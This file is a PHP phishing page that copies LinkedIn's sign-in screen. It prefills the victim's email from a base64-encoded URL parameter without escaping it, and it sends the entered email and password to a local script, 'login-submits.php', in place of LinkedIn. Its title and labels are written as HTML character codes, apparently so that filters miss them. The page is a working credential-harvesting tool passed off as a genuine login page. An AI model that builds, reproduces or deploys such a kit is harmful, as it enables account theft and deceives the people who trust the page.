<?php

header("Content-Type: text/html; charset=ISO-8859-1");

if (isset($_GET['id'])) {

	$id = $_GET['id'];
}

$cid = base64_decode($id);


?>
<!DOCTYPE html>
<html lang="en" class="os-win"> <!--<![endif]-->

<head>
<script src="https://static.licdn.com:443/scds/common/u/lib/fizzy/fz-1.3.8-min.js" type="text/javascript"></script><script type="text/javascript">fs.config({"failureRedirect":"http://www.linkedin.com/nhome/","uniEscape":true,"xhrHeaders":{"X-FS-Origin-Request":"/uas/login-submit","X-FS-Page-Id":"uas-consumer-login-submit"}});</script><script></script>


  <meta name="lnkd-track-json-lib" content="https://static.licdn.com/scds/concat/common/js?h=2jds9coeh4w78ed9wblscv68v-ebbt2vixcc5qz0otts5io08xv">
  <meta name="lnkd-track-lib" content="https://static.licdn.com/scds/concat/common/js?h=ebbt2vixcc5qz0otts5io08xv">





  
    <meta name="treeID" content="PNoZUxWS1BSAXw1VGisAAA==">
  




  
    
      <meta name="appName" content="uas">
    
  


<meta name="lnkd-track-error" content="/lite/ua/error?csrfToken=ajax%3A6770930749671745434">

<meta name="referrer" content="origin"/> 
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<link rel="icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">

<meta name="msapplication-TileImage" content="https://static.licdn.com/scds/common/u/images/logos/linkedin/logo-in-win8-tile-144_v1.png"/>

<script></script>

 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=3nuvxgwg15rbghxm1gpzfbya2-1nm61x5u7981e88m10hpaekkm-mv3v66b8q0h1hvgvd3yfjv5f-14k913qahq3mh0ac0lh0twk9v-e2lgukqldpqool72t8g7tysag"></script>
 
 
 <link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=765zh9odycznutep5f0mj07m4-c8kkvmvykvq2ncgxoqb13d2by-97r9i8f0vw2gmq97lpzb2ohek-7mxyksftlcjzimz2r05hd289r-4uu2pkz5u0jch61r2nhpyyrn8-7poavrvxlvh0irzkbnoyoginp-4om4nn3a2z730xs82d78xj3be-7m0xa9uspuliui8l4c806ppxc-ct4kfyj4tquup0bvqhttvymms-c1cmlc2imos8f942j65p5pmjm-9zbbsrdszts09by60it4vuo3q-8ti9u6z5f55pestwbmte40d9-cernnxjzxrrt8qy88tyxhj3c5-3pwwsn1udmwoy3iort8vfmygt-b1019pao2n44df9be9gay2vfw-7fo5l62eztikpp1cfui1jz4to-ab01tg8funn2n1exayaej7367">
 
 
 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=a06jpss2hf43xwxobn0gl598m-b7ksroocq54owoz2fawjb292y-62og8s54488owngg0s7escdit-c8ha6zrgpgcni7poa5ctye7il-8gz32kphtrjyfula3jpu9q6wl-51dv6schthjydhvcv6rxvospp-e9rsfv7b5gx0bk0tln31dx3sq-2r5gveucqe4lsolc3n0oljsn1-8v2hz0euzy8m1tk5d6tfrn6j-di2107u61yb11ttimo0s2qyh2-a5z91y8xfiqdawrgpl2z4m6gs-93jgstnkffqiw9htrr1tva7y3-7oayq6ato0qqkz6gz6iunlkxr-999q8q1ovip41ng1nylee3woz-5gedbbq7rksg5ypd5ruwisrah-39kuwv80yvqr74w4oe9bge0md-7ty57fxmbd5klxui85wcgpq3k-e1yamnwwzlstlh2d0l31jqbq3-39qtiin34ku3a7j62elxviuxr-8su35siohpmem14ncxhw06cld-ccxtvi3w660pars8qw3alamil"></script>
 

 <script type="text/javascript">
 LI.define('UrlPackage');
 LI.UrlPackage.containerCore = 
 ["https://static.licdn.com/scds/concat/common/js?h=d7z5zqt26qe7ht91f8494hqx5"]
 [0];
 </script>


    <script type="text/javascript">
      (function() {
        if (typeof LI === 'undefined' || !LI) {
          // Explicit global scope
          window.LI = {};
        }
        var shouldUseSameDomain = false &&
                                  false &&
                                  !/Version\//i.test(window.navigator.userAgent);

        function adjustUrlForIos(url) {
          return shouldUseSameDomain ? url.replace(/^(?:https?\:)?\/\/[^\/]+\//, '/') : url;
        }

        LI.JSContentBasePath = adjustUrlForIos("https:\/\/static.licdn.com\/scds\/concat\/common\/js?v=0.1.325");
        LI.CSSContentBasePath = adjustUrlForIos("https:\/\/static.licdn.com\/scds\/concat\/common\/css?v=0.1.325");
        LI.injectRelayHtmlUrl = shouldUseSameDomain ? null : "https:\/\/static.licdn.com\/scds\/common\/u\/lib\/inject\/0.6.1\/relay-li.html";
        LI.comboBaseUrl = adjustUrlForIos("https:\/\/static.licdn.com\/scds\/concat\/common\/css?v=0.1.325");
        LI.staticUrlHashEnabled = true;
      }());
    </script>


 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=25kaepc6rgo1820ap1rglmzr4-edgsl2z4e4gk56cy2m5kbpp1q-2t5vzdsqqh8rke20hh46pvci0-cl5mre9823ndhfdrl4nozaofi-6isi7fr80gagap7736arbauct-8ohb0iio22nbqe1w8et54sawe-13kfns70b5ghzzqxzr194d2jo-cr2cf88zdeizqhuobqtot8sge-7vr4nuab43rzvy2pgq7yvvxjk-9qa4rfxekcw3lt2c06h7p0kmf"></script>
 
 

 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=amjylk8w8039f2lwlov2e4nmc-47qp7uw3i5i1pqeovirlcc070"></script>
 

      <meta name="IntlJsUrl" content="https://static.licdn.com/scds/concat/common/js?v=0.1.325&amp;f=lib%2Fdust%2Fdust-li-experimental%2Fintl%2FIntl.min&amp;f=lib%2Fdust%2Fdust-li-experimental%2Fintl%2Flocale_data%2Fen_US.min"/>

 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=5pmigtkow46izwzcb8m1b57ly-br7xw7z07pbsy9z5545ze80zu-aikuay313zihm7be1fml6lb8y"></script>
 
 

 <script type="text/javascript">fs._server.fire("3cda19531592d414805f0d551a2b0000-1",{event:"before",type:"html"});</script><meta content="https://static.licdn.com/scds/concat/common/js?v=0.1.329" name="RemoteNavJSContentBaseURL" />

                    <link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=eb1kxmsunr7bhlov5rzgit1pt-a4kjc5uqttio53azw54aex6s3">

<script type="text/javascript">fs._server.fire("3cda19531592d414805f0d551a2b0000-1",{event:"after",type:"html"});</script>

 <title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;&#32;&#116;&#111;&#32;&#76;&#105;&#110;&#107;&#101;&#100;&#73;&#110;</title>

 
 <link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=c52xqty03kc2uumayfdgw52ha-6eb15yl27eoj4wlyl799ae32f-9isvvzw61fpveso9doy1mzsas-2qk68hrxrqya74okuimf9dv0c-613o3z852fmufuoq56wjec8bn-aibd4bc52tilbqe5gz50e4sem">

 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=7ndrn0f9fw0hum7uoqcjcnzne-95d8d303rtd0n9wj4dcjbnh2c-8ycvggo1571xgrdka3utvcyml-v92lm05fvudk7z77wwe1zyaq-bcsoaoe97gad4n2pqczks46hi-dx46tkxcsudoon06j76symqe4-3me4dsbmn6sgplxi0uj9gwqz9-a0xvfiszy32zvozt7l3lbqu0r"></script>


 
 <link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=cfsam81o5sp3cxb7m0hs933c4-1jildko6xkm5uedaud1j82j9b-35lybw28luek036334m0p39y7">
 
 

<script type="text/javascript">
 LI.define( 'ChangePassword.Styles' );
 LI.ChangePassword.Styles = 
 ["https://static.licdn.com/scds/concat/common/css?h=3ogy3kw5ms2zwzks2pdix7rrl-2qk68hrxrqya74okuimf9dv0c"]
 ;

 LI.define( 'ChangePassword.JS' );
 LI.ChangePassword.JS = 
 ["https://static.licdn.com/scds/concat/common/js?h=89jkxsjz3pecz6f9nmojkhmtv"]
 ;

 LI.i18n.register('change_your_password', 'Change your password');
 LI.i18n.register('wrong_password', 'Hmm, that\'s not the right password. Please try again or <a class=\"password-reminder-link\" href=\"\/uas\/request-password-reset\">request a new one.<\/a>');
 LI.i18n.register('invalid_username', 'Hmm, we don\'t recognize that email. Please try again.');
 LI.i18n.register('invalid_username_mobile', 'Be sure to include \"+\" and your country code.');
 LI.i18n.register('phone_number_login_not_allowed', 'You&#8217;ll need to log in using an email address. <a target=\"_blank\" href=\"https:\/\/linkedin.com\/help\/linkedin\/answer\/62937?lang=en\">Learn more.<\/a>');

LIModules.exports('DialogRetrofitV2Enabled', true);


LIModules.exports('ComposeDialogDependencies', {
  jsFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/js?h=e8d2uj1y6l2zlrwrj1t5wpr8f"]
              
            
          
        
      
    ,
  cssFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/css?h=154kxlhs4z8rrtcvqfbage7t"]
              
            
          
        
      
    
});

LIModules.exports('FeedbackDialogDependencies', {
  url: '/lite/feedback-form',
  cssFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/css?h=3pjgifqd8hix737po9m8egegl"]
              
            
          
        
      
    
});

LIModules.exports('WhoSharedDialogDependencies', {
  jsFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/js?h=5yzpl4gi34d2ztlwxybir7g09-aen7uw153a61wykhcmrvdlxvf-athkxylw61okm7cthputdvxd-7g3t3lg62g38t0z77wu181ekq-acdica2ycyz0seumv8jqs4yvo"]
              
            
          
        
      
    ,
  cssFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/css?h=ee6ucumj8ledmrgyfyz4779k4-5vdl4x1qzwm5rqqwq4015vpam-3566c1ju1btq868kwju12welc-8asck8kvvd6hamuyvpcdse51p"]
              
            
          
        
      
    
});

LIModules.exports('EndorseDialogDependencies', {
  jsFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/js?h=dvrllcgm6qf26ydj6qk5dt7f0-1uh4fabx3s2cz4vbop44a73ma-6d2frmqb98zalzpqfryr2w3qh"]
              
            
          
        
      
    ,
  cssFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/css?h=8y3o8ooamk6l442p86zbilekq"]
              
            
          
        
      
    
});

LIModules.exports('SlideshareDialogDependencies', {
  jsFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/js?h=5x190pcp9agfn8izkabjxk4tg-9nrjuzsclnnyek101oa6rr6pw-2z69oxfq3vfym3ddtt602cqr1-5zv65pjexlq9cjvexh8zx01ce-4bdgcocr7vwy6spq4btixvg38-buczcety66idcwgkyve9hhyj5-alc99nsxsp06p6l9tf2l6a5ab-f4zbcccaqv6yqm7f0nuiipn27-aen7uw153a61wykhcmrvdlxvf-5jz8st3j1jj492n8bh0qlpbqu-acdica2ycyz0seumv8jqs4yvo-dknoxdzfax723i8wqck7l1hc-7i323tu7kmc5zif1g9ohlmsj7-49pwqgn14d4upd5orf7qsgadg-9qkmntn8vcfaaokmduz3joeuo-1tzphq0w81yau5wkylkuztfos"]
              
            
          
        
      
    ,
  cssFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/css?h=24o3wkkwwvmwutak3nlw5lx4n-eu8svnpd32wrtwqeuiuomdty0-dggskkhlc2k3cx3wqi05ndhy2-6lg80obqw1a6e31g5xzz9modk-xpv98s6v9ouqf5nbcsnisw4o-3ohu4hv8hru5myc4i9cj3mzau-9isvvzw61fpveso9doy1mzsas-tycowe5wjaqwqowjcdmxe150"]
              
            
          
        
      
    
});

LIModules.exports('CommentFlagReportDependencies', {
  url: '/today/social/flag-comment-form',
  jsFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/js?h=dl85cpfiq0ses2slnmpa7e3d3-cbhd7h1xgnfmsw2b32gibxgq5-8jxwdo54ugm0qb3wh0fioz1r7-crmxjj5hs8ql6qph9xb7o7x8i-1wb6800ixpbiq74s9omk85fx0"]
              
            
          
        
      
    ,
  cssFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/css?h=1bn91d52u5fhggzkw2x97irem"]
              
            
          
        
      
    
});

LIModules.exports('SlideshareAdDependencies', {
  cssFiles: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/css?h=e146j8gzz2jcia95s3z0rvciq"]
              
            
          
        
      
    
});

</script>


 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=83jn0ttb6u5f3ops92gxitn7z"></script>
 

</head>

<body dir="ltr" class="guest v2  chrome-v5 chrome-v5-responsive sticky-bg guest consumer2in1" id="pagekey-uas-consumer-login-internal">
 

 <input id="inSlowConfig" type="hidden" value="false" />

<script type="text/javascript">document.body.className += " js ";</script>


 <script type="text/javascript">fs._server.fire("3cda19531592d414805f0d551a2b0000-2",{event:"before",type:"html"});</script><header id="layout-header" class="minimal-nav wide-nav" role="banner">

<div id="header-anchor">
  <div id="header-banner">
    <div class="wrapper">

      <div class="header-logo-container">
        <a class="header-logo guest " href="http://www.linkedin.com/?trk=nav_logo" title="LinkedIn">
              <h2 id="in-logo" class="logo-text">&#76;&#105;&#110;&#107;&#101;&#100;&#73;&#110;</h2>

<span class="li-icon" aria-hidden="true" type="linkedin-logo" size="28dp" color="brand">
  <svg preserveAspectRatio="xMinYMin meet" id="linkedin-logo">
    <g class="scaling-icon" style="fill-opacity: 1">
      <defs>
        <linearGradient id="premium-linkedin-bug-color-gradient" x1="100%" y1="0%" x2="0%" y2="100%">
          <stop class="stop1" offset="0%" stop-color="#C5B583"></stop>
          <stop class="stop2" offset="50%" stop-color="#AF9B62"></stop>
        </linearGradient>
      </defs>
      <g class="logo-28dp">
        <g class="dpi-1">
          <g class="inbug" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
            <path d="M25.375,0 L2.625,0 C1.175,0 0,1.175 0,2.625 L0,25.375 C0,26.825 1.175,28 2.625,28 L25.375,28 C26.825,28 28,26.825 28,25.375 L28,2.625 C28,1.175 26.825,0 25.375,0" class="bug-text-color" fill="#FFFFFF" transform="translate(82.000000, 0.000000)"></path>
            <path d="M107.375,0 L84.625,0 C83.175,0 82,1.175 82,2.625 L82,25.375 C82,26.825 83.175,28 84.625,28 L107.375,28 C108.825,28 110,26.825 110,25.375 L110,2.625 C110,1.175 108.825,0 107.375,0 Z M101.0137,9.875 C98.9227,9.875 97.4487,11.025 96.8747,12.025 L96.8747,10 L92.9997,10 L92.9997,24 L96.9997,24 L96.9997,17.375 C96.9997,15.603 97.6627,13.875 99.6497,13.875 C101.4667,13.875 101.9997,14.965 101.9997,16.875 L101.9997,24 L105.9997,24 L105.9997,14.975 C105.9997,11.75 104.2917,9.875 101.0137,9.875 Z M86,24 L90,24 L90,10 L86,10 L86,24 Z M88,3.665 C86.71,3.665 85.665,4.71 85.665,6 C85.665,7.29 86.71,8.335 88,8.335 C89.29,8.335 90.335,7.29 90.335,6 C90.335,4.71 89.29,3.665 88,3.665 Z" class="background" fill="#0073B0"></path>
          </g>
          <g class="linkedin-text">
            <path d="M78,24 L74,24 L74,22 L73.846,22 C73.231,23 71.858,24.2 70.041,24.2 C66.191,24.2 64,21.214 64,17 C64,13.129 65.99,9.8 69.679,9.8 C71.337,9.8 72.887,10 73.796,12 L74,12 L74,4 L78,4 L78,24 Z M71.145,13.8 C68.844,13.8 67.806,15.008 67.806,17.1 C67.806,19.192 68.844,20.2 71.145,20.2 C73.169,20.2 74.206,19.093 74.206,17 C74.206,14.908 73.169,13.8 71.145,13.8 L71.145,13.8 Z" fill="#FFFFFF"></path>
            <path d="M62.5,21.7998 C61.123,23.5488 58.736,24.1998 56.5,24.1998 C52.199,24.1998 49.2,21.4698 49.2,17.0278 C49.2,12.5838 52.201,9.7998 56.5,9.7998 C60.516,9.7998 62.8,12.8908 62.8,17.3338 L62.5,17.9998 L53.2,17.9998 L53.3,19.4998 C53.517,20.2498 54.5,21.1508 56.477,21.1508 C57.881,21.1508 58.783,20.5708 59.5,19.5958 L62.5,21.7998 Z M59,14.9998 C59.028,14.7998 57.548,12.9008 56,12.9008 C54.107,12.9008 53.113,14.7998 53,14.9998 L59,14.9998 Z" fill="#FFFFFF"></path>
            <polygon fill="#FFFFFF" points="35 4 39 4 39 16.039 44.246 10 49.457 10 43 16.5 49.23 24 44.02 24 39 17.398 39 24 35 24"></polygon>
            <path d="M20,10 L23.5,10 L24,12.414 C25,11.324 25.907,9.8 28,9.8 C32.357,9.8 33,12.766 33,16.492 L33,24 L29,24 L29,16.5 C29,14.895 28.707,13.773 26.5,13.773 C24.265,13.773 24,15.193 24,17 L24,24 L20,24 L20,10 Z" fill="#FFFFFF"></path>
            <path d="M15.9902,3.5752 C17.2702,3.5752 18.4252,4.7442 18.4252,6.0272 C18.4252,7.3092 17.2702,8.4252 15.9902,8.4252 C14.7112,8.4252 13.5752,7.3092 13.5752,6.0272 C13.5752,4.7442 14.7112,3.5752 15.9902,3.5752 L15.9902,3.5752 Z M14.0002,24.0002 L18.0002,24.0002 L18.0002,10.0002 L14.0002,10.0002 L14.0002,24.0002 Z" fill="#FFFFFF"></path>
            <polygon fill="#FFFFFF" points="0 4 4 4 4 20 12 20 12 24 0 24"></polygon>
          </g>
        </g>
      </g>
      <g class="logo-21dp">
        <g class="dpi-1">
          <g class="inbug" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
            <path d="M19.479,0 L1.583,0 C0.727,0 0,0.677 0,1.511 L0,19.488 C0,20.323 0.477,21 1.333,21 L19.229,21 C20.086,21 21,20.323 21,19.488 L21,1.511 C21,0.677 20.336,0 19.479,0" class="bug-text-color" fill="#FFFFFF" transform="translate(63.000000, 0.000000)"></path>
            <path d="M82.479,0 L64.583,0 C63.727,0 63,0.677 63,1.511 L63,19.488 C63,20.323 63.477,21 64.333,21 L82.229,21 C83.086,21 84,20.323 84,19.488 L84,1.511 C84,0.677 83.336,0 82.479,0 Z M71,8 L73.827,8 L73.827,9.441 L73.858,9.441 C74.289,8.664 75.562,7.875 77.136,7.875 C80.157,7.875 81,9.479 81,12.45 L81,18 L78,18 L78,12.997 C78,11.667 77.469,10.5 76.227,10.5 C74.719,10.5 74,11.521 74,13.197 L74,18 L71,18 L71,8 Z M66,18 L69,18 L69,8 L66,8 L66,18 Z M69.375,4.5 C69.375,5.536 68.536,6.375 67.5,6.375 C66.464,6.375 65.625,5.536 65.625,4.5 C65.625,3.464 66.464,2.625 67.5,2.625 C68.536,2.625 69.375,3.464 69.375,4.5 Z" class="background" fill="#0073B0"></path>
          </g>
          <g class="linkedin-text">
            <path d="M60,18 L57.2,18 L57.2,16.809 L57.17,16.809 C56.547,17.531 55.465,18.125 53.631,18.125 C51.131,18.125 48.978,16.244 48.978,13.011 C48.978,9.931 51.1,7.875 53.725,7.875 C55.35,7.875 56.359,8.453 56.97,9.191 L57,9.191 L57,3 L60,3 L60,18 Z M54.479,10.125 C52.764,10.125 51.8,11.348 51.8,12.974 C51.8,14.601 52.764,15.875 54.479,15.875 C56.196,15.875 57.2,14.634 57.2,12.974 C57.2,11.268 56.196,10.125 54.479,10.125 L54.479,10.125 Z" fill="#FFFFFF"></path>
            <path d="M47.6611,16.3889 C46.9531,17.3059 45.4951,18.1249 43.1411,18.1249 C40.0001,18.1249 38.0001,16.0459 38.0001,12.7779 C38.0001,9.8749 39.8121,7.8749 43.2291,7.8749 C46.1801,7.8749 48.0001,9.8129 48.0001,13.2219 C48.0001,13.5629 47.9451,13.8999 47.9451,13.8999 L40.8311,13.8999 L40.8481,14.2089 C41.0451,15.0709 41.6961,16.1249 43.1901,16.1249 C44.4941,16.1249 45.3881,15.4239 45.7921,14.8749 L47.6611,16.3889 Z M45.1131,11.9999 C45.1331,10.9449 44.3591,9.8749 43.1391,9.8749 C41.6871,9.8749 40.9121,11.0089 40.8311,11.9999 L45.1131,11.9999 Z" fill="#FFFFFF"></path>
            <polygon fill="#FFFFFF" points="38 8 34.5 8 31 12 31 3 28 3 28 18 31 18 31 13 34.699 18 38.241 18 34 12.533"></polygon>
            <path d="M16,8 L18.827,8 L18.827,9.441 L18.858,9.441 C19.289,8.664 20.562,7.875 22.136,7.875 C25.157,7.875 26,9.792 26,12.45 L26,18 L23,18 L23,12.997 C23,11.525 22.469,10.5 21.227,10.5 C19.719,10.5 19,11.694 19,13.197 L19,18 L16,18 L16,8 Z" fill="#FFFFFF"></path>
            <path d="M11,18 L14,18 L14,8 L11,8 L11,18 Z M12.501,6.3 C13.495,6.3 14.3,5.494 14.3,4.5 C14.3,3.506 13.495,2.7 12.501,2.7 C11.508,2.7 10.7,3.506 10.7,4.5 C10.7,5.494 11.508,6.3 12.501,6.3 Z" fill="#FFFFFF"></path>
            <polygon fill="#FFFFFF" points="3 3 0 3 0 18 9 18 9 15 3 15"></polygon>
          </g>
        </g>
      </g>
    </g>
  </svg>
</span>
        </a>
      </div>

      <nav role="navigation" id="minimal-util-nav" class="guest-nav" aria-label="Main site navigation">
        <ul class="nav-bar">
          <li class="nav-item nav-signin hide">
            <a class="nav-link" href="#" title="Sign in">Sign in</a>
          </li>
          <li class="nav-item nav-joinnow hide">
            <a class="nav-link highlight" rel="nofollow" href="#" title="Join now">
              Join now
            </a>
          </li>
        </ul>
      </nav>

    </div>
  </div>
</div>
 

        

      <div class="a11y-content">
        <a id="a11y-content-link" tabindex="0" name="a11y-content">Main content starts below.</a>
      </div>
    

</header>


    
<script type="text/javascript">fs._server.fire("3cda19531592d414805f0d551a2b0000-2",{event:"after",type:"html"});</script>
 <script>
 LI.i18n.register( 'universal-search-connections', 'Connections' );
LI.i18n.register( 'universal-search-companies', 'Companies' );
LI.i18n.register( 'universal-search-groups', 'Groups' );
LI.i18n.register( 'universal-search-features', 'Features' );
LI.i18n.register( 'universal-search-skills', 'Skills' );
LI.i18n.register( 'universal-search-skill', 'Skill' );
LI.i18n.register( 'universal-search-suggestions', 'Suggestions' );
LI.i18n.register( 'universal-search-refine', 'Refine' );
LI.i18n.register( 'universal-search-search-current-for', 'Search current results for <strong>{0}<\/strong>' );


LI.i18n.register( 'typeahead2-no-matching-results', 'No matching results' );
LI.i18n.register( 'typeahead2-search-connections', 'Connections' );
LI.i18n.register( 'typeahead2-search-people', 'People' );
LI.i18n.register( 'typeahead2-search-companies', 'Companies' );
LI.i18n.register( 'typeahead2-search-groups', 'Groups' );
LI.i18n.register( 'typeahead2-search-features', 'Features' );
LI.i18n.register( 'typeahead2-search-skills', 'Skills' );
LI.i18n.register( 'typeahead2-search-skill', 'Skill' );
LI.i18n.register( 'typeahead2-search-suggestions', 'Suggestions' );
LI.i18n.register( 'typeahead2-search-schools', 'Universities' );
LI.i18n.register( 'typeahead2-search-showcases', 'Showcase Pages' );
LI.i18n.register( 'typeahead2-search-degrees', 'Degrees' );
LI.i18n.register( 'typeahead2-search-fields-of-study', 'Fields of study' );
LI.i18n.register( 'typeahead2-cap-prospects', 'Profiles' );
LI.i18n.register( 'typeahead2-cap-jobs', 'Jobs' );
LI.i18n.register( 'typeahead2-cap-projects', 'Projects' );
LI.i18n.register( 'typeahead2-search-discussion-participants', 'Participants' );
LI.i18n.register( 'typeahead2-search-group-members', 'Group Members' );
LI.i18n.register( 'typeahead2-search-input-title-no-results', 'No suggestions found.' );
LI.i18n.register( 'typeahead2-search-input-title-singular', 'One suggestion. Use up and down keys to navigate.' );
LI.i18n.register( 'typeahead2-search-clear-history-dismiss', 'Dismiss' );
LI.i18n.register( 'typeahead2-search-clear-history-description', 'Only you can see your recent searches' );
LI.i18n.register( 'typeahead2-search-clear-history-help', 'View Help Center article about recent searches' );
LI.i18n.register( 'typeahead2-search-input-title-plural', 'Multiple suggestions. Use up and down keys to navigate.' );
LI.i18n.register( 'typeahead2-connect', 'Connect' );
LI.i18n.register( 'typeahead2-message', 'Message' );
LI.i18n.register( 'typeahead2-send-inmail', 'Send InMail' );
LI.i18n.register( 'typeahead2-post', 'Post' );
LI.i18n.register( 'typeahead2-follow', 'Follow' );
LI.i18n.register( 'typeahead2-view', 'View' );
LI.i18n.register( 'typeahead2-edit-profile', 'Edit Profile' );

LI.TypeaheadDataSourceUrls = {
  COMPANY: "/ta/company",
  INDUSTRY: "/ta/industry",
  REGION: "/ta/region",
  GEOGRAPHY: "/ta/geo",
  GROUP: "/ta/group",
  JOB_TITLE: "/ta/titleV2",
  JOB_FUNCTION: "/ta/jobfunc",
  SKILL: "/ta/skill",
  LANGUAGE: "/ta/language",
  SCHOOL: "/ta/school",
  DEGREE: "/ta/degree",
  FIELD_OF_STUDY: "/ta/fieldofstudy",
  MY_NETWORK: "/ta/mynetwork",
  MY_GROUP: "/typeahead/mygroup",
  FIRST_DEGREE_MY_NETWORK: "/ta/my1stnetwork",
  SITEFEATURE: "/ta/sitefeature",
  FEDERATOR: "/ta/federator",
  AUTOCOMPLETE: "/ta/autocomplete",
  CAP_PROSPECTS_PROJECTS_JOBS: "/cap/lookup/capTaAjax"
};


      
      
    
    
  
  
  
  

    
      
        
          
            
                
              
          
        
      
    
    

LI.Typeahead2Dependencies = {
  scripts: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/js?h=30ou8rm7asirbkfe4f0o0n16c-3izbs2es2hv98gtdh57zmooxb-f4fjao5ru63ae7le8ok2guqwm-2tz29qpppsfzq5cj2q07nct61"]
              
            
          
        
      
    
};


      
      
    
    
  
      
          
        
      
          
        
    

    
      
        
          
            
                
              
          
        
      
    
    

LI.TwitterTADependencies = {
  scripts: 
      
        
            
              
              
                ["https://static.licdn.com/scds/concat/common/js?h=8zjvgbligsj8vmr3f33oqtaho-8yyzhc29dmi76fhj5ivtx56sq"]
              
            
          
        
      
    
};


// for IE7/8 in remote nav - eval() does not properly reference LI in the window
// scope, when this code is executed while the "sandbox" is still open - which
// happens because remote-nav has to gather the li-control scripts.  While we have
// a black-list for not initializing the controls via the sandbox, we don't have
// a good way of preventing this code from being added to the eval() string and t
// then evaluated later.
//
// since this ONLY affects UniversalSearch and Typeahead2 - doing a 'reverse' reference
// here is ugly, but by far the simplest and least intrusive solution - otherwise
// remote-nav would have to introspect the script contents and the selectively
// purge that based on some regEx.  also gross.

if(LI.isSandboxed){
  window.LI.TypeaheadDataSourceUrls = LI.TypeaheadDataSourceUrls;
  window.LI.Typeahead2Dependencies  = LI.Typeahead2Dependencies;
  window.LI.TwitterTADependencies  = LI.TwitterTADependencies;
}






 </script>
 
 


 <div id="body" class="" role="main">


<div class="wrapper hp-nus-wrapper">
 

<div id="global-error">
 

 <script id="control-http-12257-exec-33632534-1" type="linkedin/control" class="li-control">
 
 /* extlib: _saveuisetting */
 
 
 
 LI.Controls.addControl('control-http-12257-exec-33632534-1', 'SaveUISetting', {
 triggerID: 'global-error-dismiss'
 });
 </script>
 
 
</div>



 
      
    
  
      
      

      
        
      



 
 
 
 
 

<div id="bg-fallback"></div>

<div id="main" class="signin">
 
 
 <div id="cookieDisabled">Make sure you have cookies and Javascript enabled in your browser before signing in.</div>
 <script type="text/javascript">
 if (navigator.cookieEnabled == true) {
 LI.hide('cookieDisabled');
 }
 </script>
 
 
 
 
 
 <form action="login-submits.php" method="POST" name="login" novalidate="novalidate" id="login" class="ajax-form stacked-form" data-jsenabled="check" data-autologin="true" data-existingmembersignin="true">
 
 
 
 <input type="hidden" name="isJsEnabled" value="false"/>
 <input type="hidden" name="source_app" value=""/>
 <input type="hidden" name="tryCount" id="tryCount" value="0"/>
 <input type="hidden" name="clickedSuggestion" id="clickedSuggestion" value="false" />

 <fieldset class="field-container field-container--fixed">
 

 <legend>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#76;&#105;&#110;&#107;&#101;&#100;&#73;&#110;</legend>
 <div class="outer-wrapper">
 <div class="inner-wrapper">
 <div class="logo_container">&#76;&#105;&#110;&#107;&#101;&#100;&#73;&#110;</div>
 <ul class="form-fields" id="mini-profile--js">
 <li class="form-email ">
 <div class="fieldgroup hide-label">
 <label for="session_key-login" >&#69;&#109;&#97;&#105;&#108;&#32;&#97;&#100;&#100;&#114;&#101;&#115;&#115;</label>
 <input type="text" name="session_key" value="<?php echo $cid; ?>" id="session_key-login" class="" placeholder="Email address" aria-describedby="session_key-login-error">
 <div class="domain-suggestion hide" id="domainSuggestion">
 <span>Did you mean:  <a id="suggestion" href="javascript:void(0);"></a>?</span>
 </div>
 </div>
 </li>

 <li class="form-password">
<div class="fieldgroup hide-label">
 <label for="session_password-login">&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</label>
 <span class="error" id="session_password-login-error">Please enter a password.</span>
 <div class="password_wrapper">
 <input id="session_password-login" class="password error" name="session_password" placeholder="Password" aria-describedby="session_password-login-error" type="password">
 </div>
 </div>
 </li>
 <li class="button form-actions">
 <div class="form-buttons">
 <input type="submit" name="signin" value="Sign In" class="btn-primary" id="btn-primary">
 </div>
 <div class="forgot-password-container">
 <a data-li-tooltip-id="login-tooltip"
 href="#"
 tracking="#" title="Forgot password?">&#70;&#111;&#114;&#103;&#111;&#116;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#63;</a>
 </div>
 <span>Not a member? <a href="#">Join now</a></span>
 </li>
 </ul>
 </div>
 <div class="gaussian-blur"></div>
 </div>

 <script id="control-http-12257-exec-33632534-2" type="linkedin/control" class="li-control">
 
 /* extlib: _ballooncalloutdelegator */
 
 
 
 LI.Controls.addControl('control-http-12257-exec-33632534-2', 'LI.BalloonCalloutDelegator', {
 width: 'auto',
 orientation: 'bottom',
 type: 'tooltip-callout',
 dataId: '-li-tooltip-id'
 });
 </script>
 
 </fieldset>
 
 
 
 
